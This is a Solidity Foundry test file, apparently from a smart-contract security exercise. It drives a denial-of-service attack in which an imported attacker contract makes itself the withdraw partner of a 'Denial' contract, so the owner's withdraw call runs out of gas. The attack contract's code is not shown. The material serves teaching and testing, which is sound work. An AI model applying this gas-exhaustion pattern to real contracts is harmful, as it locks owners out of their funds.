// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "~/DoS/Denial.sol";
import "~/DoS/DenialAttack.sol";

contract DenialTest is Test {
  address owner = vm.addr(1);
  address hacker = vm.addr(2);

  function setUp() public {}

  function testReentranceAttack() public {
    uint256 initialGas = gasleft();
    vm.startPrank(owner);
    Denial DenialContract = new Denial();
    address payable denialAddr = payable(address(DenialContract));
    vm.deal(denialAddr, 100 ether); // Deal 100 ether to the Denial contract.
    DenialContract.setWithdrawPartner(hacker);

    // verify that withdraw is successful.
    DenialContract.withdraw();
    assertEq(owner.balance, 1 ether, "owner balance should be 1 ETH");
    assertEq(hacker.balance, 1 ether, "hacker (current partner) balance should be 1 ETH");
    vm.stopPrank();

    // Hacker exploit the smart contract.
    vm.startPrank(hacker);
    DenialAttack exploiterContract = new DenialAttack(denialAddr);
    exploiterContract.attack();
    assertEq(DenialContract.partner(), address(exploiterContract)); // confirm withdraw partner
    vm.stopPrank();

    // Simulate a hypothetical "infinite" gas limit, transaction revert "OutOfGas".
    uint256 INFINITE_GAS = 30_000_000;
    vm.expectRevert("Out of Gas");
    vm.prank(owner);
    (bool result, ) = denialAddr.call{ gas: INFINITE_GAS }(abi.encodeWithSignature("withdraw()"));
    uint256 gasUsed = initialGas - gasleft();
    assert(!result && gasUsed > INFINITE_GAS);
  }
}
